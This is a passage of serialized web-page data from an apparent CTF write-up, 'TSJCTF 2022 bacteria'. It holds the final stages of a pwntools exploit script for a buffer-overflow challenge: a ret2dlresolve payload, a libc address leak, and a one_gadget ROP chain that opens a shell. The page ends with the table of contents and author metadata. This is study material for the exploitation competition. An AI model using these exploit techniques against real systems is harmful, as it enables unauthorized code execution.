ret2dlresolve\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"dlresolver \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x401000\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"rw_section\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"dlresolver\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"reloc_arg\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"mov_rsi_rbp_read\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"p\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"send\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"payload\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Get leaked address\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"write_addr \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" u64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"p\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"recv\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"8\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"log\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"success\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"'Leak address: '\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),\" \",(0,e.jsx)(n.span,{className:\"token builtin\",children:\"hex\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"write_addr\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"libc_base \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" write_addr \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x1111d0\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"log\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"success\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"'Libc base: '\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),\" \",(0,e.jsx)(n.span,{className:\"token builtin\",children:\"hex\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"libc_base\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"#########################\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"### Stage 6: Get flag ###\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"#########################\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"one_gadget \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0xe6c7e\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"xor_r12_pop_r12 \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0xd31f0\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\"                               \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Fake rbp, not use more\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"libc_base \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),\" xor_r12_pop_r12\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\"    \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# rip\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\"                              \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# For that pop r12\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"libc_base \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),\" one_gadget\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"p\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"send\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"payload\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"p\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"interactive\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),`\n`,(0,e.jsxs)(n.h2,{id:\"4-get-flag\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#4-get-flag\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"4. Get flag\"]}),`\n`,(0,e.jsx)(n.p,{children:\"I made this write up when the server closed so I was only able to obtain the fake flag:\"}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/tsjctf-2022/bacteria/get_flag.png\",alt:\"get_flag.png\"})})]})}}var _=f;function y(a,s){throw new Error(\"Expected \"+(s?\"component\":\"object\")+\" `\"+a+\"` to be defined: you likely forgot to import, pass, or provide it.\")}return x;})();\n;return Component;","toc":[{"value":"bacteria","url":"#bacteria","depth":2},{"value":"1. Find bug","url":"#1-find-bug","depth":2},{"value":"2. Brainstorming","url":"#2-brainstorming","depth":2},{"value":"3. Exploit","url":"#3-exploit","depth":2},{"value":"Stage 1: Stack pivot","url":"#stage-1-stack-pivot","depth":3},{"value":"Stage 2: Fake address and structure of Elf64_Sym","url":"#stage-2-fake-address-and-structure-of-elf64_sym","depth":3},{"value":"Stage 3: Fake address and structure of Elf64_Rela","url":"#stage-3-fake-address-and-structure-of-elf64_rela","depth":3},{"value":"Stage 4. Fake address and structure of STRTAB","url":"#stage-4-fake-address-and-structure-of-strtab","depth":3},{"value":"Stage 5. Conduct ret2dlresolve & Leak libc address","url":"#stage-5-conduct-ret2dlresolve--leak-libc-address","depth":3},{"value":"Stage 6. Get shell","url":"#stage-6-get-shell","depth":3},{"value":"4. Get flag","url":"#4-get-flag","depth":2}],"frontMatter":{"readingTime":{"text":"25 min read","minutes":24.08,"time":1444800,"words":4816},"slug":"tsjctf-2022/bacteria","fileName":"tsjctf-2022/bacteria.md","title":"TSJCTF 2022  bacteria","date":"2022-03-02T00:00:00.000Z","draft":false,"authors":["Johnathan"],"tags":["TSJCTF 2022","pwn","Shell","Buffer Overflow","Binary Exploit"],"summary":"Buffer overflow for shell.","canonical":"https://github.com/nhtri2003gmail/CTFNote/tree/master/writeup/2022/TSJ-CTF-2022/bacteria"}},"authorDetails":[{"readingTime":{"text":"1 min read","minutes":0.2,"time":12000,"words":40},"slug":["Johnathan"],"fileName":"Johnathan.md","name":"Johnathan","avatar":"https://www.gravatar.com/avatar/aa9cc3f27f3b1f3c47841d62f18c039f?d=identicon&s=256","specialties":["Pwn"],"github":"https://github.com/nhtri2003gmail","member":true,"retired":true,"description":"A person who does magic things.","order":2,"date":null}],"prev":{"title":"Ugra CTF Quals 2022  noteasy03","date":"2022-03-02T00:00:00.000Z","draft":false,"authors":["yanhu"],"tags":["Ugra CTF Quals 2022","Crypto","ECC","Elliptic Curve","Misc","Cipher","Caesar"],"summary":"Single table substitution on Elliptic Curve","canonical":"https://yanhuijessica.github.io/Chictf-Writeups/crypto/noteasy03/","slug":"ugra-ctf-quals-2022/noteasy03"},"next":{"title":"Ugra CTF Quals 2022  ","date":"2022-03-04T00:00:00.000Z","draft":false,"authors":["thebish0p"],"tags":["Ugra CTF Quals 2022","Crypto","XOR","Automation","Web Socket"],"summary":"Sometimes you have to google the outputs xD","slug":"ugra-ctf-quals-2022/xorxorracing"}},"__N_SSG":true}